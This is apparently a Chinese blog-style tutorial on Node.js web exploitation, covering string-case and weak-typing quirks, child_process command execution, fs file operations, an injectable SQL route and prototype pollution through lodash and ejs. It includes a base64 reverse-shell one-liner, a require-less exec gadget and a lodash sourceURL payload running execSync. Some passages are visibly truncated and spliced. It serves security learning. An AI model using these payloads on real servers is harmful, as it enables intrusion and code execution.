# 前言
最近在看NodeJS的漏洞，进行相关总结。以下不对每一条链进行剖析，只给出相关利用方法。如果有错误，还请各位师傅指正。
# NodeJS
### 介绍
简单的说 Node.js 就是运行在服务端的 JavaScript。
Node.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。
Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript
的速度非常快，性能非常好。
### 应用
  * 第一大类：用户表单收集系统、后台管理系统、实时交互系统、考试系统、联网软件、高并发量的web应用程序
  * 第二大类：基于web、canvas等多人联网游戏
  * 第三大类：基于web的多人实时聊天客户端、聊天室、图文直播
  * 第四大类：单页面浏览器应用程序
  * 第五大类：操作数据库、为前端和移动端提供基于`json`的API
# Node JS特性
### 大小写特性
toUpperCase()是javascript中将小写转换成大写的函数。
但是它还有其他的功能。
    "ı".toUpperCase() == 'I'，"ſ".toUpperCase() == 'S'
toLowerCase()是javascript中将大写转换成小写的函数。
同样。
    "K".toLowerCase() == 'k'
p神：
### 弱类型比较
    console.log(1=='1'); //true
    console.log(1>'2'); //false
    console.log('1''3'); //true
    console.log('111'>'3'); //false
    console.log('asd'>1); //false
数字与数字字符串比较时，数字型字符串会被强转之后比较。
字符串与字符串比较，比第一个ASCII码。
    console.log([]==[]); //false
    console.log([]>[]); //false
    console.log([6,2]>[5]); //true
    console.log([100,2]   1. **spawn()** ：启动一个子进程来执行命令。spawn (命令，{shell:true})。需要开启命令执行的指令。
>   2. **exec()**
> ：启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。实际使用可以不加回调函数。
>   3. **execFile()** ：启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。
>   4. **fork()** ：与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js
> 文件，实际利用中需要提前写入恶意文件
>
>
> 区别：
>
>   1. **_spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性_** ，设置超时时间，
> 一旦创建的进程运行超过设定的时间将会被杀死。
>   2. exec()与execFile()不同的是， ** _exec()适合执行已有的命令，execFile()适合执行文件_** 。
>
#### settimeout()
settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。
    var express = require("express");
    var app = express();
    setTimeout(()=>{
      console.log("console.log('Hacked')");
    },2000);
    var server = app.listen(1234,function(){
        console.log("应用实例，访问地址为 http://127.0.0.1:1234/");
    })
#### setinterval()
setinterval (function,time)，该函数的作用是每个两秒执行一次代码。
    var express = require("express");
    var app = express();
    setInterval(()=>{
      console.log("console.log('Hacked')");
    },2000);
    var server = app.listen(1234,function(){
        console.log("应用实例，访问地址为 http://127.0.0.1:1234/");
    })
#### function()
function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。
    var express = require("express");
    var app = express();
    var aaa=Function("console.log('Hacked')")();
    var server = app.listen(1234,function(){
        console.log("应用实例，访问地址为 http://127.0.0.1:1234/");
    })
### process 模块进行命令执行
#### **exec** ：
    require('child_process').exec('calc');
#### **execFile**
    require('child_process').execFile("calc",{shell:true});
#### **fork**
    require('child_process').fork("./hacker.js");
#### **spawn**
    require('child_process').spawn("calc",{shell:true});
#### 反弹shell
    require('child_process').exec('echo SHELL_BASE_64|base64 -d|bash');
    注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
> PS：如果上下文中没有require(类似于Code-Breaking 2018
> Thejs)，则可以使用`global.process.mainModule.constructor._load('child_process').exec('calc')`来执行命令
### 文件操作
既然我们可以执行函数，那自然可以进行文件的增删改查。
操作函数后面有Sync代表同步方法。
> Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的
> fs.readFileSync()。
>
> 异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。
>
> 建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。
    res.end(require('fs').readdirSync('.').toString())
    res.end(require('fs').writeFileSync('./daigua.txt','内容').toString());
    res.end(require('fs').readFileSync('./daigua.txt').toString());
    res.end(require('fs').rmdirSync('./daigua').toString());
### 防御措施
最有效的措施是避免上述功能，同时全面了解第三方模块的代码库。例如，在上面展示的演示eval()容易受到攻击的场景的代码片段中，可以通过使用JSON.parse()实现同样的目标，同时降低风险。
话虽如此，在某些情况下，不仅可以避免易受攻击的函数，而且还需要将用户输入传递给它。在这些情况下，最好的方法是对输入进行验证和消毒。
可以通过已经标准化的函数或只允许特定字符或特定格式的白名单正则表达式来验证输入。
可以通过转义任何可以由脆弱函数解释的字符来完成消毒。大多数框架都已经有了安全清除用户输入的功能。
# SQLi
node.js 的 sql 注入和 php 这些都差不多，都是缺少对特殊字符的验证，用户可控输入和原本执行的代码。
    var mysql      = require('mysql');
    var express = require("express");
    const app = express();
    var db = mysql.createConnection({
      host     :'localhost',
      user     :'root',
      password :'root',
      database :'test'
    });
    db.connect();
    app.get('/hello/:id',(req,res)=>{
    let sql=`select * from user where id= ${req.params.id}`;
        db.query(sql,(err,result)=>{
    if(err){
        console.log(err);
    res.send(err)
    }else{
        console.log(result);
        res.send(result)
    }
    })
    });
# 原型链污染
> 在此之前，可以看看JS的继承与原型链
>
>  CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain>
### 原理
看完JS的继承与原型链，相必已经能猜到原型链污染是什么意思了。简单的说，就是我们控制私有属性(`__proto__`)指向的原型对象（
**prototype** ），将其的属性产生变更。那么所继承它的对象也会拥有这个属性。
对于语句：`object[a][b] = value`
如果可以控制a、b、value的值，将a设置为`__proto__`，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。
    object1 = {"a":1, "b":2};
    object1.__proto__.foo = "Hello World";
    console.log(object1.foo);
    object2 = {"c":1, "d":2};
    console.log(object2.foo);
Object1和Object2相当于都继承了Object.prototype，所以当我们对一个对象设置foo属性，就造成了原型链污染，倒置Object2也拥有了foo属性。
利用原型链污染，那我们需要设置`__proto__`的值，也就是需要找到能够控制数组（对象）的“键名”的操作。最常见的就是merge，clone，copy。
    function merge(target, source) {
        for (let key in source) {
            if (key in source && key in target) {
                merge(target[key], source[key])
            } else {
                target[key] = source[key]
            }
        }
    }
    let o1 = {}
    let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    merge(o1, o2)
    console.log(o1.a, o1.b)
    o3 = {}
    console.log(o3.b)
需要注意，只有在JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。
**_模块的污染各种各样，不能一一给出，只能给出具有代表性的几个。_**
### lodash
以[Code-Breaking 2018 Thejs](https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js)为例。
>
> lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：
>
>   1. `lodash.template` 一个简单的模板引擎
>   2. `lodash.merge` 函数或对象的合并
>
>
> 其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。
lodash.template  
显式的lodashs.merge存在原型链污染漏洞，为了对其进行利用，需要找到可以对原型进行修改的逻辑。
options的sourceURL  
options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。
    var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。
JS当中每个函数都是一个Fuction对象，`(function(){}).constructor === Function`
    var person = { age:3 }
    var myFunction = new Function("a", "return 1*a*this.age");
    myFunction.apply(person,[2])
    // return 1*a*this.age 即为functionBody，可以执行我们的代码。
sourceURL传递到了Function函数的第二个参数当中，此处可以
    var result = attempt(function() {
        return Function(importsKeys, sourceURL + 'return ' + source)
          .apply(undefined, importsValues);
      });
通过构造chile_process.exec()就可以执行任意代码了
    {"__proto__":{"sourceURL":"\nreturn e=> {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')}\n//"}}
**以下链不进行分析，给出相应题目和WP。**
### ejs
> 主要为两个函数的伪造。
>
> opts.outputFunctionName
>
> opts.escapeFunction
##### **例一**
test.js
    var express = require('express');
    var _= require('lodash');
    var ejs = require('ejs');
    var app = express();
    //设置模板的位置
    app.set('views', __dirname);